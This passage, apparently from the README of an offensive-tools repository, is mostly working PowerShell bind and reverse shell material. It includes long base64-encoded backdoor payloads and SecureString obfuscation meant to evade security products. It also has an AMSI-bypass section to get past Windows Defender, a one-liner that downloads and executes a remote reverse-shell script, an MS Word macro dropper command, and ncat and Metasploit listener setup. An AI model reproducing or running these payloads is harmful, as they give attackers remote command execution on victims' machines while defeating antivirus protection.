wAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsAIAAkAGwAIAA9ACAAJABuAHUAbABsADsAIAAkAGMAIAA9ACAAJABuAHUAbABsADsAIAAkAHQAIAA9ACAAJABuAHUAbABsADsAIAAkAGIAIAA9ACAAJABuAHUAbABsADsAIAAkAHcAIAA9ACAAJABuAHUAbABsADsAIAAkAGQAIAA9ACAAJABuAHUAbABsADsAIAAkAHIAIAA9ACAAJABuAHUAbABsADsAIAB0AHIAeQAgAHsAIAAkAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEwAaQBzAHQAZQBuAGUAcgAoACIAMAAuADAALgAwAC4AMAAiACwAIAAkAHAAKQA7ACAAJABsAC4AUwB0AGEAcgB0ACgAKQA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBhAGMAawBkAG8AbwByACAAaQBzACAAdQBwACAAYQBuAGQAIAByAHUAbgBuAGkAbgBnAC4ALgAuAGAAbgBgAG4AVwBhAGkAdABpAG4AZwAgAGYAbwByACAAYwBsAGkAZQBuAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0AC4ALgAuAGAAbgAiADsAIABkAG8AIAB7ACAAaQBmACAAKAAkAGwALgBQAGUAbgBkAGkAbgBnACgAKQApACAAewAgACQAYwAgAD0AIAAkAGwALgBBAGMAYwBlAHAAdABUAGMAcABDAGwAaQBlAG4AdAAoACkAOwAgAH0AIABlAGwAcwBlACAAewAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA1ADAAMAA7ACAAfQAgAH0AIAB3AGgAaQBsAGUAIAAoACQAYwAgAC0AZQBxACAAJABuAHUAbABsACkAOwAgACQAbAAuAFMAdABvAHAAKAApADsAIAAkAHQAIAA9ACAAJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIAAkAGIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMQAwADIANAA7ACAAJABlACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABUAGUAeAB0AC4AQQBzAGMAaQBpAEUAbgBjAG8AZABpAG4AZwA7ACAAJAB3ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoACQAdAApADsAIAAkAHcALgBBAHUAdABvAEYAbAB1AHMAaAAgAD0AIAAkAHQAcgB1AGUAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEMAbABpAGUAbgB0ACAAaABhAHMAIABjAG8AbgBuAGUAYwB0AGUAZAAhAGAAbgAiADsAIAAkAGIAeQAgAD0AIAAwADsAIABkAG8AIAB7ACAAJAB3AC4AVwByAGkAdABlACgAIgBQAFMAPgAiACkAOwAgAGQAbwAgAHsAIAAkAGIAeQAgAD0AIAAkAHQALgBSAGUAYQBkACgAJABiACwAIAAwACwAIAAkAGIALgBMAGUAbgBnAHQAaAApADsAIABpAGYAIAAoACQAYgB5ACAALQBnAHQAIAAwACkAIAB7ACAAJABkACAAPQAgACQAZAAgACsAIAAkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsACAAMAAsACAAJABiAHkAKQA7ACAAfQAgAH0AIAB3AGgAaQBsAGUAIAAoACQAdAAuAEQAYQB0AGEAQQB2AGEAaQBsAGEAYgBsAGUAKQA7ACAAaQBmACAAKAAkAGIAeQAgAC0AZwB0ACAAMAApACAAewAgACQAZAAgAD0AIAAkAGQALgBUAHIAaQBtACgAKQA7ACAAaQBmACAAKAAkAGQALgBMAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAApACAAewAgAHQAcgB5ACAAewAgACQAcgAgAD0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAtAEMAbwBtAG0AYQBuAGQAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAOwAgAH0AIABjAGEAdABjAGgAIAB7ACAAJAByACAAPQAgACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAOwAgAH0AIABDAGwAZQBhAHIALQBWAGEAcgBpAGEAYgBsAGUAIAAtAE4AYQBtAGUAIAAiAGQAIgA7ACAAJABsAGUAIAA9ACAAJAByAC4ATABlAG4AZwB0AGgAOwAgAGkAZgAgACgAJABsAGUAIAAtAGcAdAAgADAAKQAgAHsAIAAkAGMAbwAgAD0AIAAwADsAIABkAG8AIAB7ACAAaQBmACAAKAAkAGwAZQAgAC0AZwBlACAAJABiAC4ATABlAG4AZwB0AGgAKQAgAHsAIAAkAGIAeQAgAD0AIAAkAGIALgBMAGUAbgBnAHQAaAA7ACAAfQAgAGUAbABzAGUAIAB7ACAAJABiAHkAIAA9ACAAJABsAGUAOwAgAH0AIAAkAHcALgBXAHIAaQB0AGUAKAAkAHIALgBzAHUAYgBzAHQAcgBpAG4AZwAoACQAYwBvACwAIAAkAGIAeQApACkAOwAgACQAYwBvACAAKwA9ACAAJABiAHkAOwAgACQAbABlACAALQA9ACAAJABiAHkAOwAgAH0AIAB3AGgAaQBsAGUAIAAoACQAbABlACAALQBnAHQAIAAwACkAOwAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAcgAiADsAIAB9ACAAfQAgAH0AIAB9ACAAdwBoAGkAbABlACAAKAAkAGIAeQAgAC0AZwB0ACAAMAApADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBDAGwAaQBlAG4AdAAgAGgAYQBzACAAZABpAHMAYwBvAG4AbgBlAGMAdABlAGQAIQAiADsAIAB9ACAAYwBhAHQAYwBoACAAewAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwAgAH0AIABmAGkAbgBhAGwAbAB5ACAAewAgAGkAZgAgACgAJABsACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsAIAAkAGwALgBTAGUAcgB2AGUAcgAuAEMAbABvAHMAZQAoACkAOwAgACQAbAAuAFMAZQByAHYAZQByAC4ARABpAHMAcABvAHMAZQAoACkAOwAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAbAAiADsAIAB9ACAAaQBmACAAKAAkAHcAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAgACQAdwAuAEMAbABvAHMAZQAoACkAOwAgACQAdwAuAEQAaQBzAHAAbwBzAGUAKAApADsAIABDAGwAZQBhAHIALQBWAGEAcgBpAGEAYgBsAGUAIAAtAE4AYQBtAGUAIAAiAHcAIgA7ACAAfQAgAGkAZgAgACgAJAB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsAIAAkAHQALgBDAGwAbwBzAGUAKAApADsAIAAkAHQALgBEAGkAcwBwAG8AcwBlACgAKQA7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgB0ACIAOwAgAH0AIABpAGYAIAAoACQAYwAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7ACAAJABjAC4AQwBsAG8AcwBlACgAKQA7ACAAJABjAC4ARABpAHMAcABvAHMAZQAoACkAOwAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAYwAiADsAIAB9ACAAaQBmACAAKAAkAGIAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAgACQAYgAuAEMAbABlAGEAcgAoACkAOwAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAYgAiADsAIAB9ACAAaQBmACAAKAAkAHIAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAcgAiADsAIAB9ACAAaQBmACAAKAAkAGQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZAAiADsAIAB9ACAAWwBTAHkAcwB0AGUAbQAuAEcAQwBdADoAOgBDAG8AbABsAGUAYwB0ACgAKQA7ACAAfQAgAH0A
```

The encoded script will prompt for input. See the slightly altered script [here](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/prompt/powershell_bind_tcp_prompt.ps1) - used the [minified](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/prompt/mini/powershell_bind_tcp_prompt_mini.ps1) script to reduce the command length.

**\[Bind TCP - Parameterized\]** To pass parameters to the PowerShell encoded command, run the following command from either PowerShell or Command Prompt:

```pwsh
PowerShell -Command "'9000'" | PowerShell -ExecutionPolicy Unrestricted -NoProfile -EncodedCommand JABzAGUAZQBkACAAPQAgACIAMwAzADAAMQBLAGkAcgBhACIAOwAgACQAcAAgAD0AIAAkACgAUgBlAGEAZAAtAEgAbwBzAHQAIAAtAFAAcgBvAG0AcAB0ACAAIgBFAG4AdABlAHIAIABwAG8AcgB0ACAAbgB1AG0AYgBlAHIAIgApAC4AVAByAGkAbQAoACkAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiACIAOwAgAGkAZgAgACgAJABwAC4ATABlAG4AZwB0AGgAIAAtAGwAdAAgADEAKQAgAHsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBQAG8AcgB0ACAAbgB1AG0AYgBlAHIAIABpAHMAIAByAGUAcQB1AGkAcgBlAGQAIgA7ACAAfQAgAGUAbABzAGUAIAB7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjAGAAbgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAYABuACMAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAQgBpAG4AZAAgAFQAQwBQACAAdgAzAC4ANQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIwBgAG4AIwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAeQAgAEkAdgBhAG4AIABTAGkAbgBjAGUAawAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAjAGAAbgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAYABuACMAIABHAGkAdABIAHUAYgAgAHIAZQBwAG8AcwBpAHQAbwByAHkAIABhAHQAIABnAGkAdABoAHUAYgAuAGMAbwBtAC8AaQB2AGEAbgAtAHMAaQBuAGMAZQBrAC8AcABvAHcAZQByAHMAaABlAGwAbAAtAHIAZQB2AGUAcgBzAGUALQB0AGMAcAAuACAAIwBgAG4AIwAgAEYAZQBlAGwAIABmAHIAZQBlACAAdABvACAAZABvAG4AYQB0AGUAIABiAGkAdABjAG8AaQBuACAAYQB0ACAAMQBCAHIAWgBNADYAVAA3AEcAOQBSAE4AOAB2AGIAYQBiAG4AZgBYAHUANABNADYATABwAGcAegB0AHEANgBZADEANAAuACAAIAAjAGAAbgAjACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACMAYABuACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAjACMAIwAiADsAIAAkAGwAIAA9ACAAJABuAHUAbABsADsAIAAkAGMAIAA9ACAAJABuAHUAbABsADsAIAAkAHQAIAA9ACAAJABuAHUAbABsADsAIAAkAGIAIAA9ACAAJABuAHUAbABsADsAIAAkAHcAIAA9ACAAJABuAHUAbABsADsAIAAkAGQAIAA9ACAAJABuAHUAbABsADsAIAAkAHIAIAA9ACAAJABuAHUAbABsADsAIAB0AHIAeQAgAHsAIAAkAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEwAaQBzAHQAZQBuAGUAcgAoACIAMAAuADAALgAwAC4AMAAiACwAIAAkAHAAKQA7ACAAJABsAC4AUwB0AGEAcgB0ACgAKQA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIAQgBhAGMAawBkAG8AbwByACAAaQBzACAAdQBwACAAYQBuAGQAIAByAHUAbgBuAGkAbgBnAC4ALgAuAGAAbgBgAG4AVwBhAGkAdABpAG4AZwAgAGYAbwByACAAYwBsAGkAZQBuAHQAIAB0AG8AIABjAG8AbgBuAGUAYwB0AC4ALgAuAGAAbgAiADsAIABkAG8AIAB7ACAAaQBmACAAKAAkAGwALgBQAGUAbgBkAGkAbgBnACgAKQApACAAewAgACQAYwAgAD0AIAAkAGwALgBBAGMAYwBlAHAAdABUAGMAcABDAGwAaQBlAG4AdAAoACkAOwAgAH0AIABlAGwAcwBlACAAewAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0ATQBpAGwAbABpAHMAZQBjAG8AbgBkAHMAIAA1ADAAMAA7ACAAfQAgAH0AIAB3AGgAaQBsAGUAIAAoACQAYwAgAC0AZQBxACAAJABuAHUAbABsACkAOwAgACQAbAAuAFMAdABvAHAAKAApADsAIAAkAHQAIAA9ACAAJABjAC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAIAAkAGIAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAEIAeQB0AGUAWwBdACAAMQAwADIANAA7ACAAJABlACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABUAGUAeAB0AC4AQQBzAGMAaQBpAEUAbgBjAG8AZABpAG4AZwA7ACAAJAB3ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBTAHQAcgBlAGEAbQBXAHIAaQB0AGUAcgAoACQAdAApADsAIAAkAHcALgBBAHUAdABvAEYAbAB1AHMAaAAgAD0AIAAkAHQAcgB1AGUAOwAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEMAbABpAGUAbgB0ACAAaABhAHMAIABjAG8AbgBuAGUAYwB0AGUAZAAhAGAAbgAiADsAIAAkAGIAeQAgAD0AIAAwADsAIABkAG8AIAB7ACAAJAB3AC4AVwByAGkAdABlACgAIgBQAFMAPgAiACkAOwAgAGQAbwAgAHsAIAAkAGIAeQAgAD0AIAAkAHQALgBSAGUAYQBkACgAJABiACwAIAAwACwAIAAkAGIALgBMAGUAbgBnAHQAaAApADsAIABpAGYAIAAoACQAYgB5ACAALQBnAHQAIAAwACkAIAB7ACAAJABkACAAPQAgACQAZAAgACsAIAAkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgAsACAAMAAsACAAJABiAHkAKQA7ACAAfQAgAH0AIAB3AGgAaQBsAGUAIAAoACQAdAAuAEQAYQB0AGEAQQB2AGEAaQBsAGEAYgBsAGUAKQA7ACAAaQBmACAAKAAkAGIAeQAgAC0AZwB0ACAAMAApACAAewAgACQAZAAgAD0AIAAkAGQALgBUAHIAaQBtACgAKQA7ACAAaQBmACAAKAAkAGQALgBMAGUAbgBnAHQAaAAgAC0AZwB0ACAAMAApACAAewAgAHQAcgB5ACAAewAgACQAcgAgAD0AIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAtAEMAbwBtAG0AYQBuAGQAIAAkAGQAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAOwAgAH0AIABjAGEAdABjAGgAIAB7ACAAJAByACAAPQAgACQAXwAuAEUAeABjAGUAcAB0AGkAbwBuACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAOwAgAH0AIABDAGwAZQBhAHIALQBWAGEAcgBpAGEAYgBsAGUAIAAtAE4AYQBtAGUAIAAiAGQAIgA7ACAAJABsAGUAIAA9ACAAJAByAC4ATABlAG4AZwB0AGgAOwAgAGkAZgAgACgAJABsAGUAIAAtAGcAdAAgADAAKQAgAHsAIAAkAGMAbwAgAD0AIAAwADsAIABkAG8AIAB7ACAAaQBmACAAKAAkAGwAZQAgAC0AZwBlACAAJABiAC4ATABlAG4AZwB0AGgAKQAgAHsAIAAkAGIAeQAgAD0AIAAkAGIALgBMAGUAbgBnAHQAaAA7ACAAfQAgAGUAbABzAGUAIAB7ACAAJABiAHkAIAA9ACAAJABsAGUAOwAgAH0AIAAkAHcALgBXAHIAaQB0AGUAKAAkAHIALgBzAHUAYgBzAHQAcgBpAG4AZwAoACQAYwBvACwAIAAkAGIAeQApACkAOwAgACQAYwBvACAAKwA9ACAAJABiAHkAOwAgACQAbABlACAALQA9ACAAJABiAHkAOwAgAH0AIAB3AGgAaQBsAGUAIAAoACQAbABlACAALQBnAHQAIAAwACkAOwAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAcgAiADsAIAB9ACAAfQAgAH0AIAB9ACAAdwBoAGkAbABlACAAKAAkAGIAeQAgAC0AZwB0ACAAMAApADsAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBDAGwAaQBlAG4AdAAgAGgAYQBzACAAZABpAHMAYwBvAG4AbgBlAGMAdABlAGQAIQAiADsAIAB9ACAAYwBhAHQAYwBoACAAewAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAEkAbgBuAGUAcgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAOwAgAH0AIABmAGkAbgBhAGwAbAB5ACAAewAgAGkAZgAgACgAJABsACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsAIAAkAGwALgBTAGUAcgB2AGUAcgAuAEMAbABvAHMAZQAoACkAOwAgACQAbAAuAFMAZQByAHYAZQByAC4ARABpAHMAcABvAHMAZQAoACkAOwAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAbAAiADsAIAB9ACAAaQBmACAAKAAkAHcAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAgACQAdwAuAEMAbABvAHMAZQAoACkAOwAgACQAdwAuAEQAaQBzAHAAbwBzAGUAKAApADsAIABDAGwAZQBhAHIALQBWAGEAcgBpAGEAYgBsAGUAIAAtAE4AYQBtAGUAIAAiAHcAIgA7ACAAfQAgAGkAZgAgACgAJAB0ACAALQBuAGUAIAAkAG4AdQBsAGwAKQAgAHsAIAAkAHQALgBDAGwAbwBzAGUAKAApADsAIAAkAHQALgBEAGkAcwBwAG8AcwBlACgAKQA7ACAAQwBsAGUAYQByAC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAIgB0ACIAOwAgAH0AIABpAGYAIAAoACQAYwAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7ACAAJABjAC4AQwBsAG8AcwBlACgAKQA7ACAAJABjAC4ARABpAHMAcABvAHMAZQAoACkAOwAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAYwAiADsAIAB9ACAAaQBmACAAKAAkAGIAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAgACQAYgAuAEMAbABlAGEAcgAoACkAOwAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAYgAiADsAIAB9ACAAaQBmACAAKAAkAHIAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAcgAiADsAIAB9ACAAaQBmACAAKAAkAGQAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAgAEMAbABlAGEAcgAtAFYAYQByAGkAYQBiAGwAZQAgAC0ATgBhAG0AZQAgACIAZAAiADsAIAB9ACAAWwBTAHkAcwB0AGUAbQAuAEcAQwBdADoAOgBDAG8AbABsAGUAYwB0ACgAKQA7ACAAfQAgAH0A
```

To generate a PowerShell encoded command from a PowerShell script, run the following PowerShell command:

```pwsh
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes([IO.File]::ReadAllText($script)))
```

To decode a PowerShell encoded command, run the following PowerShell command:

```pwsh
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($command))
```

### PowerShell SecureString

Secure strings can get pretty long.

Most security products will flag a PowerShell script as malicious if the script uses `&` symbol excessively.

To generate a PowerShell SecureString from a PowerShell script, run the following PowerShell command:

```pwsh
ConvertFrom-SecureString -k (0..15) (ConvertTo-SecureString (Get-Content -Path $script -Raw) -AsPlainText -Force)
```

To decode and run a PowerShell SecureString, run the following PowerShell command:

```pwsh
IEX((New-Object System.Net.NetworkCredential("", (ConvertTo-SecureString -k (0..15) $string))).Password)
```

Check the manually obfuscated and converted bind shell script [here](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/secure_string/powershell_bind_tcp_secure_string.ps1).

Check the manually obfuscated and converted reverse shell script [here](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/secure_string/powershell_reverse_tcp_secure_string.ps1).

## AMSI Bypass

If Windows Defender is blocking your PowerShell script or encoded command execution, generate an AMSI bypass code from [AMSI.fail](https://amsi.fail) and run it in your PowerShell session. Credits to the author!

After running the AMSI bypass code, you can download the content of your PowerShell script from the web using this one-liner:

```pwsh
IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/prompt/mini/powershell_reverse_tcp_prompt_mini.ps1').GetResponse().GetResponseStream()).ReadToEnd());
```

Find out more about AMSI bypass at [S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell). Credits to the author!

## MS Word

To embed a PowerShell script into an MS Word document, check [macro_pack](https://github.com/sevagas/macro_pack) tool. Credits to the author!

Run the following command from either PowerShell or Command Prompt:

```fundamental
echo "https://raw.githubusercontent.com/ivan-sincek/powershell-reverse-tcp/master/src/powershell_reverse_tcp.ps1" | macro_pack.exe -t DROPPER_PS -o -G powpow.doc
```

## Set Up a Listener

To set up a listener, open your preferred console on Kali Linux and run one of the examples below.

Set up `ncat` listener:

```fundamental
ncat -nvlp 9000
```

Set up `multi/handler` listener:

```fundamental
msfconsole -q

use exploit/multi/handler

set PAYLOAD windows/shell_reverse_tcp

set LHOST 192.168.8.185

set LPORT 9000

exploit
```

## Images

<p align="center"><img src="https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/img/backdoor.jpg" alt="Backdoor"></p>

<p align="center">Figure 1 - Backdoor</p>

<p align="center"><img src="https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/img/listener.png" alt="Listener"></p>

<p align="center">Figure 2 - Listener</p>
